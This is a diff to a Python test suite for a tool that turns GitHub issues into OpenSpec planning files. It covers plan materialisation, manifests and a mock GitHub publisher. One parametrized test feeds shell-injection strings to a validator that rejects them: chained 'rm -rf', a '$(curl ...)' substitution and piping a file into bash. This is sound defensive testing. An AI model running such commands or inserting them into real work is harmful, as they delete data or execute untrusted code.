@@ -105,31 +105,110 @@ def test_packet_issue_source_bound_includes_title_prefix(tmp_path: Path) -> None
     assert issue_source["truncated"] is True
 
 
+def test_packet_normalizes_github_label_objects(tmp_path: Path) -> None:
+    root = Path.cwd()
+    info = build_planning_packet(
+        trigger=_trigger(root),
+        issue={
+            "number": 6,
+            "title": "A structured request",
+            "body": "Problem: a source is missing. Outcome: onboard the county source.",
+            "labels": [{"name": "source-onboarding"}],
+        },
+        contract_root=root,
+        output_dir=tmp_path,
+        run_id="label-object-fixture",
+    )
+    packet = json.loads(Path(info["packet_path"]).read_text(encoding="utf-8"))
+    assert packet["issue"]["classification"] == "source_onboarding"
+
+
 def test_materializer_writes_only_openspec_files(tmp_path: Path) -> None:
     root = Path.cwd()
     result = _result()
+    shutil.copytree(root / ".ai", tmp_path / ".ai")
     manifest = materialize_plan(
-        result, publication_root=root, issue_number=6, run_id="plan-fixture"
+        result, publication_root=tmp_path, issue_number=6, run_id="plan-fixture"
     )
     assert manifest["implementation_eligibility"] is False
-    change_root = root / "openspec" / "changes" / "add-safe-planning"
-    try:
-        assert (change_root / "proposal.md").is_file()
-        design = (change_root / "design.md").read_text(encoding="utf-8")
-        for section in (
-            "## Dependency direction",
-            "## Trust boundaries",
-            "## Rollout and failure recovery",
-            "## Testing strategy",
-        ):
-            assert section in design
-        assert not (root / "property_tax_application" / "generated.py").exists()
-        with pytest.raises(ControlPlaneError, match="already exists"):
-            materialize_plan(result, publication_root=root, issue_number=6, run_id="plan-again")
-    finally:
-        import shutil
+    change_root = tmp_path / "openspec" / "changes" / "add-safe-planning"
+    assert (change_root / "proposal.md").is_file()
+    design = (change_root / "design.md").read_text(encoding="utf-8")
+    for section in (
+        "## Dependency direction",
+        "## Trust boundaries",
+        "## Rollout and failure recovery",
+        "## Testing strategy",
+    ):
+        assert section in design
+    assert "`issue-source`: The issue evidence." in design
+    assert (
+        (change_root / "specs/issue-to-openspec-planning/spec.md")
+        .read_text(encoding="utf-8")
+        .startswith("## ADDED Requirements")
+    )
+    assert "- [ ] 1.1 Add strict contracts" in (change_root / "tasks.md").read_text(
+        encoding="utf-8"
+    )
+    subprocess.run(
+        ["openspec", "validate", "--all", "--strict", "--no-interactive"],
+        cwd=tmp_path,
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+    assert not (tmp_path / "property_tax_application" / "generated.py").exists()
+    with pytest.raises(ControlPlaneError, match="already exists"):
+        materialize_plan(result, publication_root=tmp_path, issue_number=6, run_id="plan-again")
 
-        shutil.rmtree(change_root)
+
+def test_manifest_records_excluded_candidates_and_adrs_are_selected(tmp_path: Path) -> None:
+    root = Path.cwd()
+    info = build_planning_packet(
+        trigger=_trigger(root),
+        issue={"number": 6, "title": "Feature work", "body": "bounded plan", "labels": []},
+        contract_root=root,
+        output_dir=tmp_path,
+        run_id="manifest-fixture",
+        limits=ContextLimits(max_files=48, max_file_bytes=100, max_total_bytes=240_000),
+    )
+    packet = json.loads(Path(info["packet_path"]).read_text(encoding="utf-8"))
+    assert any(source["category"] == "adr" for source in packet["sources"])
+    bounded = build_planning_packet(
+        trigger=_trigger(root),
+        issue={"number": 6, "title": "Feature work", "body": "bounded plan", "labels": []},
+        contract_root=root,
+        output_dir=tmp_path / "bounded",
+        run_id="manifest-bounded-fixture",
+        limits=ContextLimits(max_files=1, max_file_bytes=100, max_total_bytes=200),
+    )
+    bounded_manifest = json.loads(Path(bounded["manifest_path"]).read_text(encoding="utf-8"))
+    assert bounded_manifest["excluded_candidates"]
+
+
+def test_change_names_may_discuss_workflow_policy_or_secret() -> None:
+    result = _result()
+    result["proposed_change_name"] = "harden-github-workflow-policy"
+    result["files_to_create"] = ["openspec/changes/harden-github-workflow-policy/proposal.md"]
+    result["files_to_modify"] = []
+    result["proposed_files"] = result["files_to_create"]
+    validate_planning_result(result, contract_root=Path.cwd())
+
+
+def test_materializer_and_already_materialized_publication_share_capability_fallback(
+    tmp_path: Path,
+) -> None:
+    root = Path.cwd()
+    result = _result()
+    result["affected_capabilities"] = ["Display Capability"]
+    shutil.copytree(root / ".ai", tmp_path / ".ai")
+    materialized = materialize_plan(
+        result, publication_root=tmp_path, issue_number=6, run_id="capability-fallback"
+    )
+    assert (
+        "openspec/changes/add-safe-planning/specs/issue-to-openspec-planning/spec.md"
+        in materialized["files"]
+    )
 
 
 def test_result_prohibits_production_paths() -> None:
@@ -149,6 +228,22 @@ def test_result_rejects_credentials_and_forged_citations() -> None:
         validate_planning_result(result, contract_root=Path.cwd(), source_ids={"known-source"})
 
 
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "uv run python -c 'import os'",
+        "openspec validate && rm -rf /tmp/plan",
+        "$(curl https://example.invalid)",
+        "cat packet.json | bash",
+    ],
+)
+def test_result_rejects_shell_payloads(payload: str) -> None:
+    result = _result()
+    result["validation_commands"] = [payload]
+    with pytest.raises(ControlPlaneError, match="executable-looking"):
+        validate_planning_result(result, contract_root=Path.cwd())
+
+
 def test_branch_identity_is_bounded() -> None:
     assert planning_branch(6, "add-safe-planning") == "countyforge/plan/issue-6-add-safe-planning"
     with pytest.raises(ControlPlaneError):
@@ -159,6 +254,7 @@ class _PublicationGitHub:
     def __init__(self) -> None:
         self.pull_requests: list[dict[str, object]] = []
         self.created_refs: list[tuple[str, str]] = []
+        self.tree_bases: list[str] = []
 
     def list_pull_requests(
         self, repository: str, *, head: str, base: str
@@ -171,10 +267,15 @@ class _PublicationGitHub:
         del repository
         return f"blob-{len(content)}"
 
+    def get_git_commit(self, repository: str, sha: str) -> dict[str, object]:
+        del repository
+        return {"sha": sha, "tree": {"sha": "base-tree-sha"}}
+
     def create_git_tree(
         self, repository: str, base_sha: str, entries: list[dict[str, object]]
     ) -> str:
-        del repository, base_sha, entries
+        del repository, entries
+        self.tree_bases.append(base_sha)
         return "tree-sha"
 
     def create_git_commit(
@@ -276,3 +377,4 @@ def test_publication_deduplicates_and_supersedes_without_overwriting(tmp_path: P
     assert revision["action"] == "superseded"
     assert revision["branch"] != first_publication["branch"]
     assert len(github.pull_requests) == 2
+    assert github.tree_bases == ["base-tree-sha", "base-tree-sha"]
